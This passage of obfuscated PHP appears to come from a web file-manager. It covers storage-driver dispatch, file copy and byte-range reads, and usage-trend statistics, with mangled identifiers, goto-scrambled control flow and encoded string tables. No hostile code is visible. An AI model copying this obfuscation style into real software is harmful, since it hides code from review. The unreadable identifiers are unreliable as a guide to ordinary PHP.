$aÔ¨ªĞÒêÚ->fileOutServer($D¹á‹ˆ÷Ş, $båÏƒĞĞãò, $Bˆ‹íÀŒ¯Û, $FÙè‡®æÑ); } return $aÔ¨ªĞÒêÚ->fileOut($D¹á‹ˆ÷Ş, $båÏƒĞĞãò, $Bˆ‹íÀŒ¯Û, $FÙè‡®æÑ); } public static function fileOutImage($Då±ğ·ƒê, $cÉ¸ŞÕ¬Š = 250) { $F¢ª¥ö” = array(250, 600, 1200, 3000); for ($bÌ‡ÓÌìùˆ = 0; $bÌ‡ÓÌìùˆ < count($F¢ª¥ö”); $bÌ‡ÓÌìùˆ++) { if ($bÌ‡ÓÌìùˆ == 0 && $cÉ¸ŞÕ¬Š <= $F¢ª¥ö”[$bÌ‡ÓÌìùˆ]) { $cÉ¸ŞÕ¬Š = $F¢ª¥ö”[$bÌ‡ÓÌìùˆ]; break; } else { if ($cÉ¸ŞÕ¬Š > $F¢ª¥ö”[$bÌ‡ÓÌìùˆ - 1] && $cÉ¸ŞÕ¬Š <= $F¢ª¥ö”[$bÌ‡ÓÌìùˆ]) { $cÉ¸ŞÕ¬Š = $F¢ª¥ö”[$bÌ‡ÓÌìùˆ]; break; } else { if ($bÌ‡ÓÌìùˆ == count($F¢ª¥ö”) - 1 && $cÉ¸ŞÕ¬Š > $F¢ª¥ö”[$bÌ‡ÓÌìùˆ]) { $cÉ¸ŞÕ¬Š = $F¢ª¥ö”[$bÌ‡ÓÌìùˆ]; break; } } } } $càÛó•°ÆŒ = self::driverMake($Då±ğ·ƒê); if ($càÛó•°ÆŒ->isFileOutServer()) { return $càÛó•°ÆŒ->fileOutImageServer($Då±ğ·ƒê, $cÉ¸ŞÕ¬Š); } return $càÛó•°ÆŒ->fileOutImage($Då±ğ·ƒê, $cÉ¸ŞÕ¬Š); } private static function driverIsSame($a—ëÅ¾¾‡À, $cÑÛæâàÛØ) { goto cªåĞæ‚Ïæ; cäĞ´°‚¸ö: if ($FÂì—£ñÂÕ != $d¡…­¨•ŒĞ) { return !1; } if ($FÂì—£ñÂÕ == $b÷íÕÊÔ[688]) { return !0; } if ($FÂì—£ñÂÕ == $b÷íÕÊÔ[101]) { return !0; } goto e…ØãÍÇ’‡; e…ØãÍÇ’‡: if ($a—ëÅ¾¾‡À->pathDriver == $cÑÛæâàÛØ->pathDriver) { return !0; } return !1; goto Fİã•ß¨…; cªåĞæ‚Ïæ: $b÷íÕÊÔ =& $_SERVER[Ä¿Ş°¨]; $FÂì—£ñÂÕ = $a—ëÅ¾¾‡À->getType(); $d¡…­¨•ŒĞ = $cÑÛæâàÛØ->getType(); goto cäĞ´°‚¸ö; Fİã•ß¨…: } public static function copyUpdate($e³®¨¦ù±ä, $cË÷¢¶­Ó) { goto d©ÓÀñ³Œ‚; A¶§ÉµÛ°Ñ: $A´ÇİÓæå = array(); foreach ($a´î‹ì‰™Ê as $dßË…Šô× => $C«˜’¦­áÚ) { if (isset($dË–á¸‚‘¥[$dßË…Šô×])) { if ($C«˜’¦­áÚ[$D¸î…«„ƒ[76]] == 1) { continue; } if ($dË–á¸‚‘¥[$dßË…Šô×][$D¸î…«„ƒ[77]] == $C«˜’¦­áÚ[$D¸î…«„ƒ[77]]) { continue; } } if ($C«˜’¦­áÚ[$D¸î…«„ƒ[76]] == 1) { $A´ÇİÓæå[] = $cË÷¢¶­Ó . $D¸î…«„ƒ[8] . $dßË…Šô×; continue; } $bÃÛ¶‹Ò = strstr(trim($dßË…Šô×, $D¸î…«„ƒ[8]), $D¸î…«„ƒ[8]) ? get_path_father($dßË…Šô×) : $D¸î…«„ƒ[33]; $eŠöÙÃİ[] = array($D¸î…«„ƒ[991] => $C«˜’¦­áÚ[$D¸î…«„ƒ[75]], $D¸î…«„ƒ[992] => rtrim($cË÷¢¶­Ó, $D¸î…«„ƒ[8]) . $D¸î…«„ƒ[8] . $bÃÛ¶‹Ò, $D¸î…«„ƒ[993] => $C«˜’¦­áÚ); } $dÖÑ±ŠæòÖ = array($D¸î…«„ƒ[163] => $eŠöÙÃİ, $D¸î…«„ƒ[76] => $A´ÇİÓæå); goto A¬˜Æá®Ë”; A¬˜Æá®Ë”: Hook::trigger($D¸î…«„ƒ[994], $e³®¨¦ù±ä, $cË÷¢¶­Ó, $dÖÑ±ŠæòÖ); foreach ($A´ÇİÓæå as $C«˜’¦­áÚ) { IO::mkdir($C«˜’¦­áÚ); } foreach ($eŠöÙÃİ as $C«˜’¦­áÚ) { IO::copy($C«˜’¦­áÚ[$D¸î…«„ƒ[991]], $C«˜’¦­áÚ[$D¸î…«„ƒ[992]], REPEAT_REPLACE); } goto Aß Ë–ÜÑ×; d©ÓÀñ³Œ‚: $D¸î…«„ƒ =& $_SERVER[Ä¿Ş°¨]; if (!IO::exist($e³®¨¦ù±ä)) { return !1; } if (!IO::exist($cË÷¢¶­Ó)) { IO::mkdir($cË÷¢¶­Ó); } goto CÁ–¸ğÔ³; CÁ–¸ğÔ³: $a´î‹ì‰™Ê = self::_listAll($e³®¨¦ù±ä); $dË–á¸‚‘¥ = self::_listAll($cË÷¢¶­Ó); $eŠöÙÃİ = array(); goto A¶§ÉµÛ°Ñ; Aß Ë–ÜÑ×: } private static function _listAll($fÔÆø¼ÂÂŞ) { $E¨êê¨³Ö =& $_SERVER[Ä¿Ş°¨]; $fÔÆø¼ÂÂŞ = KodIO::clear($fÔÆø¼ÂÂŞ); $aÈëÌŠ‡· = IO::listAll($fÔÆø¼ÂÂŞ); foreach ($aÈëÌŠ‡· as &$Dì’¾øË¦¹) { $fßøá¹¬ò™ = substr($Dì’¾øË¦¹[$E¨êê¨³Ö[75]], strlen($fÔÆø¼ÂÂŞ)); $Dì’¾øË¦¹[$E¨êê¨³Ö[995]] = trim($fßøá¹¬ò™, $E¨êê¨³Ö[8]); } return array_to_keyvalue($aÈëÌŠ‡·, $E¨êê¨³Ö[995]); } public static function fileSubstr($bİ…‘È‘áİ, $b£¦¾š”½², $A¯Û®§¬‹„ = false) { goto c«à²òŞ†¤; aßØÜ„§ÈØ: if ($b£¦¾š”½² + $A¯Û®§¬‹„ > $EÒÃ·à…œ) { $A¯Û®§¬‹„ = $EÒÃ·à…œ - $b£¦¾š”½²; } if ($A¯Û®§¬‹„ <= 0) { return $_SERVER[Ä¿Ş°¨][33]; } if ($b£¦¾š”½² < 0 || $b£¦¾š”½² >= $EÒÃ·à…œ || $A¯Û®§¬‹„ > 1024 * 1024 * 5) { throw new Exception("\146\x69\154\145\x52\x65\141\144\x20\x65\162\x72\157\162\41\40\x73\164\x61\162\x74\75{$b£¦¾š”½²}\x3b\x6c\145\x6e\x67\164\x68\75{$A¯Û®§¬‹„}\x3b\40\x73\151\x7a\x65\75{$EÒÃ·à…œ}\73"); } goto Bì²×‰ªŞ™; A¤­‰ç‘Ã: $DêÛ×“¢â = $A¯Û®§¬‹„; if ($b£¦¾š”½² < 0) { $b£¦¾š”½² = $EÒÃ·à…œ + $b£¦¾š”½²; } if ($A¯Û®§¬‹„ === !1) { $A¯Û®§¬‹„ = $EÒÃ·à…œ - $b£¦¾š”½²; } goto aßØÜ„§ÈØ; c«à²òŞ†¤: $DÏ½Î·ŞÊÀ = self::driverMake($bİ…‘È‘áİ); $EÒÃ·à…œ = $DÏ½Î·ŞÊÀ->size($bİ…‘È‘áİ); $d‹„ŒÉµŒ³ = $b£¦¾š”½²; goto A¤­‰ç‘Ã; Bì²×‰ªŞ™: return $DÏ½Î·ŞÊÀ->fileSubstr($bİ…‘È‘áİ, $b£¦¾š”½², $A¯Û®§¬‹„); goto Dá¢¢õØ•¤; Dá¢¢õØ•¤: } private static function driverMake(&$BãŞ¥¶ïÚô) { goto EÜƒ‹ììÚÏ; bÕòÎ§®Õ: return $F”ê‚ËÓÚˆ; goto Dä¯Ûß­÷õ; Bòç«œ‹Õù: if ($d„©“±ÚÈÕ[$CŠ¤Û¯ââ[29]] == KodIO::KOD_IO && !self::$driverListSystem[$d„©“±ÚÈÕ[$CŠ¤Û¯ââ[372]]]) { return !1; } $BãŞ¥¶ïÚô = $d„©“±ÚÈÕ[$CŠ¤Û¯ââ[996]]; $F”ê‚ËÓÚˆ = self::driverGet($d„©“±ÚÈÕ, $BãŞ¥¶ïÚô); goto bÕòÎ§®Õ; EÜƒ‹ììÚÏ: $CŠ¤Û¯ââ =& $_SERVER[Ä¿Ş°¨]; $d„©“±ÚÈÕ = KodIO::parse($BãŞ¥¶ïÚô); if (!self::$driverListSystem) { $C¥ó‹„½¶ = Model($CŠ¤Û¯ââ[698])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($C¥ó‹„½¶, $CŠ¤Û¯ââ[372]); } goto Bòç«œ‹Õù; Dä¯Ûß­÷õ: } private static function driverGet($d„¸ÔÂÌØ, &$EÃºäø) { goto däè£¢ñ±”; bİÃÖ§‹Ë³: if (isset($d’•ëá…Ó“[$dåÊ‹¢ ”[6]][$dåÊ‹¢ ”[1009]])) { $FôÑÊ×Ëá->pathBase = rtrim($d’•ëá…Ó“[$dåÊ‹¢ ”[6]][$dåÊ‹¢ ”[1009]], $dåÊ‹¢ ”[8]) . $dåÊ‹¢ ”[8]; $EÃºäø = $FôÑÊ×Ëá->pathBase . ltrim($EÃºäø, $dåÊ‹¢ ”[8]); } $EÃºäø = $FôÑÊ×Ëá->getPath($EÃºäø); if (isset($d„¸ÔÂÌØ[$dåÊ‹¢ ”[983]])) { $EÃºäø = $d„¸ÔÂÌØ[$dåÊ‹¢ ”[983]]; } goto B÷ò·²àğ; B÷ò·²àğ: $FôÑÊ×Ëá->path = $EÃºäø; return $FôÑÊ×Ëá; goto d‘‹·ã¨İ›; cŒÊ©‹¨ˆè: $FôÑÊ×Ëá = self::$driverCache[$F¯™ºâ¹Ó†]; $FôÑÊ×Ëá->pathDriver = $E˜¿‡Œ¸Ò¨; $FôÑÊ×Ëá->pathBase = $dåÊ‹¢ ”[33]; goto bİÃÖ§‹Ë³; böæÚ¾­Ó”: switch ($d„¸ÔÂÌØ[$dåÊ‹¢ ”[29]]) { case KodIO::KOD_IO: $d’•ëá…Ó“ = self::$driverListSystem[$a‰ä“­‡¡]; break; case KodIO::KOD_SOURCE: $EÃºäø = $a‰ä“­‡¡ . $EÃºäø; $d’•ëá…Ó“ = array($dåÊ‹¢ ”[998] => $dåÊ‹¢ ”[999], $dåÊ‹¢ ”[6] => $d„¸ÔÂÌØ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $dó‡½É‰Í­ = $GLOBALS[$dåÊ‹¢ ”[1000]]; self::$driverListUser = array_to_keyvalue($dó‡½É‰Í­, $dåÊ‹¢ ”[372]); } $d’•ëá…Ó“ = self::$driverListUser[$a‰ä“­‡¡]; break; case KodIO::KOD_SHARE_LINK: $d’•ëá…Ó“ = array($dåÊ‹¢ ”[998] => $dåÊ‹¢ ”[1001], $dåÊ‹¢ ”[6] => $d„¸ÔÂÌØ); $e°—½«—ùñ = Action($dåÊ‹¢ ”[1002])->sharePathInfo($d„¸ÔÂÌØ[$dåÊ‹¢ ”[75]]); $EÃºäø = $e°—½«—ùñ[$dåÊ‹¢ ”[374]]; if (!$e°—½«—ùñ[$dåÊ‹¢ ”[374]]) { $a˜æÙÍº×¤ = Model($dåÊ‹¢ ”[540])->getInfo($e°—½«—ùñ[$dåÊ‹¢ ”[445]]); $EÃºäø = KodIO::clear($a˜æÙÍº×¤[$dåÊ‹¢ ”[1003]] . $d„¸ÔÂÌØ[$dåÊ‹¢ ”[996]]); $d„¸ÔÂÌØ[$dåÊ‹¢ ”[443]] = $a˜æÙÍº×¤; $d„¸ÔÂÌØ[$dåÊ‹¢ ”[983]] = $EÃºäø; $d’•ëá…Ó“ = array($dåÊ‹¢ ”[998] => $dåÊ‹¢ ”[1004], $dåÊ‹¢ ”[6] => $d„¸ÔÂÌØ); } break; case KodIO::KOD_SHARE_ITEM: $d’•ëá…Ó“ = array($dåÊ‹¢ ”[998] => $dåÊ‹¢ ”[1005], $dåÊ‹¢ ”[6] => $d„¸ÔÂÌØ); $a˜æÙÍº×¤ = Model($dåÊ‹¢ ”[540])->getInfo($d„¸ÔÂÌØ[$dåÊ‹¢ ”[372]]); if ($a˜æÙÍº×¤[$dåÊ‹¢ ”[374]] == $dåÊ‹¢ ”[472]) { $EÃºäø = KodIO::clear($a˜æÙÍº×¤[$dåÊ‹¢ ”[1003]] . $d„¸ÔÂÌØ[$dåÊ‹¢ ”[996]]); $d„¸ÔÂÌØ[$dåÊ‹¢ ”[443]] = $a˜æÙÍº×¤; $d„¸ÔÂÌØ[$dåÊ‹¢ ”[983]] = $EÃºäø; $d’•ëá…Ó“ = array($dåÊ‹¢ ”[998] => $dåÊ‹¢ ”[1006], $dåÊ‹¢ ”[6] => $d„¸ÔÂÌØ); } break; default: $EÃºäø = $d„¸ÔÂÌØ[$dåÊ‹¢ ”[75]]; $d’•ëá…Ó“ = array($dåÊ‹¢ ”[998] => $dåÊ‹¢ ”[1007]); break; } $F¯™ºâ¹Ó† = $d„¸ÔÂÌØ[$dåÊ‹¢ ”[75]]; if (!isset(self::$driverCache[$F¯™ºâ¹Ó†])) { $d¶äï·Ú©Æ = strtolower($d’•ëá…Ó“[$dåÊ‹¢ ”[90]]); $eàÆÅ®Œ‡† = $GLOBALS[$dåÊ‹¢ ”[6]][$dåÊ‹¢ ”[84]][$dåÊ‹¢ ”[1008]]; $D†Ÿö¾Ö–ö = $dåÊ‹¢ ”[71] . (isset($eàÆÅ®Œ‡†[$d¶äï·Ú©Æ]) ? $eàÆÅ®Œ‡†[$d¶äï·Ú©Æ] : ucfirst($d¶äï·Ú©Æ)); if (!class_exists($D†Ÿö¾Ö–ö)) { show_json("{$D†Ÿö¾Ö–ö}\x20\156\x6f\164\x20\145\170\151\163\164\163\x21", !1); } $B‰£ë¤ÚÕÈ = isset($d’•ëá…Ó“[$dåÊ‹¢ ”[6]]) ? $d’•ëá…Ó“[$dåÊ‹¢ ”[6]] : !1; self::$driverCache[$F¯™ºâ¹Ó†] = new $D†Ÿö¾Ö–ö($B‰£ë¤ÚÕÈ); } goto cŒÊ©‹¨ˆè; däè£¢ñ±”: $dåÊ‹¢ ” =& $_SERVER[Ä¿Ş°¨]; $E˜¿‡Œ¸Ò¨ = $d„¸ÔÂÌØ[$dåÊ‹¢ ”[997]]; $a‰ä“­‡¡ = $d„¸ÔÂÌØ[$dåÊ‹¢ ”[372]]; goto böæÚ¾­Ó”; d‘‹·ã¨İ›: } } goto A“ÜÍÜ¤œ; eØ¨±«ó¸: register_shutdown_function($_SERVER[£›Åú§µ][36]); set_error_handler($_SERVER[£›Åú§µ][49], $Añ•î³Œ®ò); if (function_exists($_SERVER[£›Åú§µ][50])) { set_exception_handler($_SERVER[£›Åú§µ][51]); } goto F£§ÉÀ‚„Ç; F¶©èˆ†¿©: class AnalysisModel extends ModelBaseLight { public function init($f‘šéÏïƒí) { $FÊ…ºâöá¿ =& $_SERVER[Ä¿Ş°¨]; $eˆÂñÈº ¦ = array($FÊ…ºâöá¿[539] => array($FÊ…ºâöá¿[29] => $FÊ…ºâöá¿[1989], $FÊ…ºâöá¿[257] => array($FÊ…ºâöá¿[206], $FÊ…ºâöá¿[694], $FÊ…ºâöá¿[1990], $FÊ…ºâöá¿[1991])), $FÊ…ºâöá¿[1992] => array($FÊ…ºâöá¿[29] => $FÊ…ºâöá¿[1993], $FÊ…ºâöá¿[257] => array($FÊ…ºâöá¿[206], $FÊ…ºâöá¿[692], $FÊ…ºâöá¿[1994], $FÊ…ºâöá¿[1995], $FÊ…ºâöá¿[1996]))); if (!isset($eˆÂñÈº ¦[$f‘šéÏïƒí])) { return !1; } $this->optionType = $eˆÂñÈº ¦[$f‘šéÏïƒí][$FÊ…ºâöá¿[29]]; $this->field = $eˆÂñÈº ¦[$f‘šéÏïƒí][$FÊ…ºâöá¿[257]]; return !0; } public function listData($A´Î‰ÍöÌ‘ = false, $e´³„¥…æÛ = "\x6d\157\144\x69\146\x79\x54\x69\x6d\x65", $fßÜÙ‰öï = false) { return parent::listData($A´Î‰ÍöÌ‘, $e´³„¥…æÛ, $fßÜÙ‰öï); } public function trendList($c¬¶¢©®Ù§) { goto e Áôéõä; c£¿ƒ“°—‰: if (!isset($aÒÄó’èè)) { $B±ÁÉôá» = $c¬¶¢©®Ù§ == $bŞƒÒˆÊù[539] ? $bŞƒÒˆÊù[481] : $bŞƒÒˆÊù[746]; $aÒÄó’èè = Model($B±ÁÉôá»)->min($bŞƒÒˆÊù[183]); } $DÕ•ÂÀ»¹ = $bŞƒÒˆÊù[1999] . ucfirst($c¬¶¢©®Ù§); $eôµÌô¨Ì = $this->dateList($aÒÄó’èè); goto eìÕƒÊ¹²; e Áôéõä: $bŞƒÒˆÊù =& $_SERVER[Ä¿Ş°¨]; $Cµåğáä = $this->listData(); if ($Cµåğáä) { $DøÔØöçé = end($Cµåğáä); $CĞÖÂ÷¨ô‡ = date($bŞƒÒˆÊù[1997], strtotime($bŞƒÒˆÊù[1998])); if ($DøÔØöçé[$bŞƒÒˆÊù[206]] == $CĞÖÂ÷¨ô‡) { return $Cµåğáä; } $aÒÄó’èè = strtotime($DøÔØöçé[$bŞƒÒˆÊù[206]]); } goto c£¿ƒ“°—‰; eìÕƒÊ¹²: foreach ($eôµÌô¨Ì as $CĞÖÂ÷¨ô‡) { $this->{$DÕ•ÂÀ»¹}($CĞÖÂ÷¨ô‡); } return $this->listData(); goto F‹ØÂ‚ºƒÎ; F‹ØÂ‚ºƒÎ: } private function dateList($eèË¯Õæœ) { $CğÆˆ›¬ß¨ =& $_SERVER[Ä¿Ş°¨]; $DÃÉ™¥â‡© = $eèË¯Õæœ; $bÜ¢Ç”‚Åõ = strtotime($CğÆˆ›¬ß¨[1998]); $Bİ¯±©ÛË¥ = array(); while ($DÃÉ™¥â‡© <= $bÜ¢Ç”‚Åõ) { $Bİ¯±©ÛË¥[] = date($CğÆˆ›¬ß¨[1997], $DÃÉ™¥â‡©); $DÃÉ™¥â‡© = strtotime($CğÆˆ›¬ß¨[2000], $DÃÉ™¥â‡©); } return $Bİ¯±©ÛË¥; } public function _recordUser($E¾¦ƒ³²‹¤ = '') { goto aÏöÎ¼›ÔÕ; aÏöÎ¼›ÔÕ: $fœ·’Áè› =& $_SERVER[Ä¿Ş°¨]; $dØ‚ƒº¨Äñ = strtotime(date($fœ·’Áè›[2001], strtotime($E¾¦ƒ³²‹¤))); $AƒĞ°£Ã“ù = strtotime(date($fœ·’Áè›[2002], strtotime($E¾¦ƒ³²‹¤))); goto AªÒòŞÀ”Æ; A½ÓÛ„ƒÀ: $bí¶¼‹ñ‹ = array($fœ·’Áè›[206] => $E¾¦ƒ³²‹¤, $fœ·’Áè›[694] => (int) $d¤¬Àéê–, $fœ·’Áè›[1990] => (int) $B¯Æ£‰‡ÒÜ, $fœ·’Áè›[1991] => (int) $c»Œ›ß‘§); return $this->insert($bí¶¼‹ñ‹); goto F©‡‡ÕÁóù; AªÒòŞÀ”Æ: $Bì¦ÑÄ¥° = array($fœ·’Áè›[183] => array($fœ·’Áè›[914], $AƒĞ°£Ã“ù)); $d¤¬Àéê– = Model($fœ·’Áè›[481])->where($Bì¦ÑÄ¥°)->count($fœ·’Áè›[1399]); $Bì¦ÑÄ¥°[$fœ·’Áè›[183]] = array($fœ·’Áè›[317], array($dØ‚ƒº¨Äñ, $AƒĞ°£Ã“ù)); goto C›ŒÂ‚“ä; C›ŒÂ‚“ä: $B¯Æ£‰‡ÒÜ = Model($fœ·’Áè›[481])->where($Bì¦ÑÄ¥°)->count($fœ·’Áè›[1399]); $Bì¦ÑÄ¥°[$fœ·’Áè›[29]] = $fœ·’Áè›[2003]; $c»Œ›ß‘§ = Model($fœ·’Áè›[2004])->where($Bì¦ÑÄ¥°)->count($fœ·’Áè›[2005]); goto A½ÓÛ„ƒÀ; F©‡‡ÕÁóù: } public function _recordStore($EÜÁ™„‡¶˜ = '') { goto A‡íÉ¦çõ; Aíƒã˜ªÒ: $dØ¹Ê„…¢«[$fß¾Í²­™ˆ[376]] = 1; $D‚ô‚ê°“ = Model($fß¾Í²­™ˆ[746])->where($dØ¹Ê„…¢«)->sum($fß¾Í²­™ˆ[77]); $dØ¹Ê„…¢«[$fß¾Í²­™ˆ[376]] = 2; goto EµŞêš È; EµŞêš È: $e¥Íà˜¼ = Model($fß¾Í²­™ˆ[746])->where($dØ¹Ê„…¢«)->sum($fß¾Í²­™ˆ[77]); $A¶˜ˆ°ì¿µ = array($fß¾Í²­™ˆ[206] => $EÜÁ™„‡¶˜, $fß¾Í²­™ˆ[692] => (int) $Bò³É£¹, $fß¾Í²­™ˆ[1994] => (int) $Fš…´Ö£ì, $fß¾Í²­™ˆ[1995] => (int) $D‚ô‚ê°“, $fß¾Í²­™ˆ[1996] => (int) $e¥Íà˜¼); return $this->insert($A¶˜ˆ°ì¿µ); goto eÙˆõ¦”—; b†‚Œ¹øÜî: $Fš…´Ö£ì = Model($fß¾Í²­™ˆ[426])->where($dØ¹Ê„…¢«)->sum($fß¾Í²­™ˆ[77]); $dØ¹Ê„…¢«[$fß¾Í²­™ˆ[375]] = 0; $Bò³É£¹ = Model($fß¾Í²­™ˆ[746])->where($dØ¹Ê„…¢«)->sum($fß¾Í²­™ˆ[77]); goto Aíƒã˜ªÒ; A‡íÉ¦çõ: $fß¾Í²­™ˆ =& $_SERVER[Ä¿Ş°¨]; $a¿‹‹¼ó = strtotime(date($fß¾Í²­™ˆ[2002], strtotime($EÜÁ™„‡¶˜))); $dØ¹Ê„…¢« = array($fß¾Í²­™ˆ[183] => array($fß¾Í²­™ˆ[914], $a¿‹‹¼ó)); goto b†‚Œ¹øÜî; eÙˆõ¦”—: } public function trend($e‡¡„¿êç, $c”Õµ…–ö) { goto a£ãğÊŒÙ«; Bô„ÒÏ³: return $dˆ˜ö…©­Ê; goto FøÉÆÙ¾; a£ãğÊŒÙ«: $DÇˆ¯Úˆ„ =& $_SERVER[Ä¿Ş°¨]; if (!$this->init($e‡¡„¿êç)) { return !1; } $C¶ŠÖ¨‘ğ» = $this->trendList($e‡¡„¿êç); goto d†® ïĞ”§; d†® ïĞ”§: if ($C¶ŠÖ¨‘ğ» && $c”Õµ…–ö != $DÇˆ¯Úˆ„[1374]) { $Cì«Í«‰ù’ = $C¶ŠÖ¨‘ğ»[0][$DÇˆ¯Úˆ„[206]]; $CÎåõš› = $this->validDate($c”Õµ…–ö, $Cì«Í«‰ù’); $f‚åÒ‡•” = array(); $f¡ÊŞ‰·¯Î = array_to_keyvalue($C¶ŠÖ¨‘ğ», $DÇˆ¯Úˆ„[206]); foreach ($CÎåõš› as $e±‘÷÷—èÚ) { if (isset($f¡ÊŞ‰·¯Î[$e±‘÷÷—èÚ])) { $AÎìŸ¤¢µİ = $f¡ÊŞ‰·¯Î[$e±‘÷÷—èÚ]; } else { $AÎìŸ¤¢µİ = end($C¶ŠÖ¨‘ğ»); $AÎìŸ¤¢µİ[$DÇˆ¯Úˆ„[206]] = $e±‘÷÷—èÚ; if ($e‡¡„¿êç == $DÇˆ¯Úˆ„[539]) { $AÎìŸ¤¢µİ[$DÇˆ¯Úˆ„[1990]] = $AÎìŸ¤¢µİ[$DÇˆ¯Úˆ„[1991]] = 0; } } $f‚åÒ‡•”[] = $AÎìŸ¤¢µİ; } $C¶ŠÖ¨‘ğ» = $f‚åÒ‡•”; } $a‹ÅÌ¿÷Ç = array($DÇˆ¯Úˆ„[539] => array($DÇˆ¯Úˆ„[694] => LNG($DÇˆ¯Úˆ„[2006]), $DÇˆ¯Úˆ„[1990] => LNG($DÇˆ¯Úˆ„[2007]), $DÇˆ¯Úˆ„[1991] => LNG($DÇˆ¯Úˆ„[2008])), $DÇˆ¯Úˆ„[1992] => array($DÇˆ¯Úˆ„[692] => LNG($DÇˆ¯Úˆ„[2009]), $DÇˆ¯Úˆ„[1994] => LNG($DÇˆ¯Úˆ„[2010]), $DÇˆ¯Úˆ„[1995] => LNG($DÇˆ¯Úˆ„[2011]), $DÇˆ¯Úˆ„[1996] => LNG($DÇˆ¯Úˆ„[2012]))); $CöíÕÜÙšÛ = array($DÇˆ¯Úˆ„[539] => $DÇˆ¯Úˆ„[2013], $DÇˆ¯Úˆ„[1992] => $DÇˆ¯Úˆ„[77]); goto dƒºğŒàÎ©; dƒºğŒàÎ©: if (empty($C¶ŠÖ¨‘ğ»)) { $e±‘÷÷—èÚ = date($DÇˆ¯Úˆ„[1997], strtotime($DÇˆ¯Úˆ„[1998])); $d±éºôšÌÂ = array($DÇˆ¯Úˆ„[206] => $e±‘÷÷—èÚ); foreach ($a‹ÅÌ¿÷Ç[$e‡¡„¿êç] as $CÛÀÄ›Æ© => $C²‹í”åæ) { $d±éºôšÌÂ[$CÛÀÄ›Æ©] = 0; } $C¶ŠÖ¨‘ğ»[] = $d±éºôšÌÂ; } $dˆ˜ö…©­Ê = array(); foreach ($C¶ŠÖ¨‘ğ» as $C²‹í”åæ) { if ($e‡¡„¿êç == $DÇˆ¯Úˆ„[1992] && $C²‹í”åæ[$DÇˆ¯Úˆ„[1994]] > $C²‹í”åæ[$DÇˆ¯Úˆ„[692]]) { $C²‹í”åæ[$DÇˆ¯Úˆ„[1994]] = $C²‹í”åæ[$DÇˆ¯Úˆ„[692]]; } foreach ($a‹ÅÌ¿÷Ç[$e‡¡„¿êç] as $CÛÀÄ›Æ© => $C–¢ä¾³ù) { $AÎìŸ¤¢µİ = array($DÇˆ¯Úˆ„[206] => $C²‹í”åæ[$DÇˆ¯Úˆ„[206]], $DÇˆ¯Úˆ„[1304] => $C–¢ä¾³ù); $AÎìŸ¤¢µİ[$CöíÕÜÙšÛ[$e‡¡„¿êç]] = isset($C²‹í”åæ[$CÛÀÄ›Æ©]) ? $C²‹í”åæ[$CÛÀÄ›Æ©] : 0; $dˆ˜ö…©­Ê[] = $AÎìŸ¤¢µİ; } } goto Bô„ÒÏ³; FøÉÆÙ¾: } public function validDate($ešèÅĞ®, $CœùäÏ£±‚) { goto b†Î¤ëÈÎ; bàåÆâ¼‹Š: return $D™æœÏ¦§; goto BŞ¡Ôé«¸é; b†Î¤ëÈÎ: $B¡½ÊÃ…ô =& $_SERVER[Ä¿Ş°¨]; $BÕŒò‰¬çİ = date($B¡½ÊÃ…ô[1997], strtotime($B¡½ÊÃ…ô[1998])); $D™æœÏ¦§ = array($BÕŒò‰¬çİ); goto aôÚ´ÏÇ¥Ò; aôÚ´ÏÇ¥Ò: switch ($ešèÅĞ®) { case $B¡½ÊÃ…ô[1381]: $f”»ÁØÜ¿’ = mktime(0, 0, 0, date($B¡½ÊÃ…ô[2014]), date($B¡½ÊÃ…ô[2015]) - date($B¡½ÊÃ…ô[1203]) + 7 - 7, date($B¡½ÊÃ…ô[2016])); $aˆãñŞ‡² = 0; do { $dñóãì·† = date($B¡½ÊÃ…ô[1997], $f”»ÁØÜ¿’ - 3600 * 24 * 7 * $aˆãñŞ‡²); $D™æœÏ¦§[] = $dñóãì·†; $aˆãñŞ‡²++; } while ($CœùäÏ£±‚ < $dñóãì·†); break; case $B¡½ÊÃ…ô[1379]: $aˆãñŞ‡² = 1; do { $B—òÓ‘Íø˜ = date($B¡½ÊÃ…ô[2017], strtotime("\55\40{$aˆãñŞ‡²}\40\155\157\156\164\x68\163")); $D™æœÏ¦§[] = $B—òÓ‘Íø˜; $aˆãñŞ‡²++; } while ($CœùäÏ£±‚ < $B—òÓ‘Íø˜); break; case $B¡½ÊÃ…ô[1684]: $B´âÂ‘†Ûˆ = (int) date($B¡½ÊÃ…ô[2016], strtotime($CœùäÏ£±‚)); $D¨­ãÊÚò = (int) date($B¡½ÊÃ…ô[2016]); if ($B´âÂ‘†Ûˆ >= $D¨­ãÊÚò) { break; } for ($B´âÂ‘†Ûˆ; $B´âÂ‘†Ûˆ < $D¨­ãÊÚò; $B´âÂ‘†Ûˆ++) { $D™æœÏ¦§[] = $B´âÂ‘†Ûˆ . $B¡½ÊÃ…ô[2018]; } break; default: break; } if ($CœùäÏ£±‚ > end($D™æœÏ¦§)) { array_pop($D™æœÏ¦§); } sort($D™æœÏ¦§); goto bàåÆâ¼‹Š; BŞ¡Ôé«¸é: } public function listTable($f¤„áÑÁë¦) { $D…§Ş§õåŠ = ucfirst($f¤„áÑÁë¦); return Model($D…§Ş§õåŠ)->listData(); } public function option($CÏáëÔ²©) { $AœÖÉ¹ŒÙŠ = $_SERVER[Ä¿Ş°¨][2019] . ucfirst($CÏáëÔ²©); return $this->{$AœÖÉ¹ŒÙŠ}(); } private function optionUser() { goto Bˆš°†‰âî; Bˆš°†‰âî: $FÔ––ÂâãÜ =& $_SERVER[Ä¿Ş°¨]; $dÅ¡é°â¶Š = Model($FÔ––ÂâãÜ[481])->count($FÔ––ÂâãÜ[1399]); $AâˆÙÙé†Õ = Model($FÔ––ÂâãÜ[481])->where($FÔ––ÂâãÜ[2020])->count($FÔ––ÂâãÜ[1399]); goto a®¢¹“Ïå; a®¢¹“Ïå: $bğ»Û¸Å…Ù = strtotime($FÔ––ÂâãÜ[2021]); $Fì’¾¿†˜¥ = array($FÔ––ÂâãÜ[2022] => array($FÔ––ÂâãÜ[915], $bğ»Û¸Å…Ù)); $Eø†µç‚˜æ = (int) Model($FÔ––ÂâãÜ[481])->where($Fì’¾¿†˜¥)->count($FÔ––ÂâãÜ[1399]); goto d“ÎˆÀÊ¹; e÷Š²¥‘é²: $b°«í‡ŞŠã = Model($FÔ––ÂâãÜ[481])->where($Fì’¾¿†˜¥)->count($FÔ––ÂâãÜ[1399]); return array($FÔ––ÂâãÜ[689] => (int) $dÅ¡é°â¶Š, $FÔ––ÂâãÜ[2023] => (int) ($dÅ¡é°â¶Š - $AâˆÙÙé†Õ), 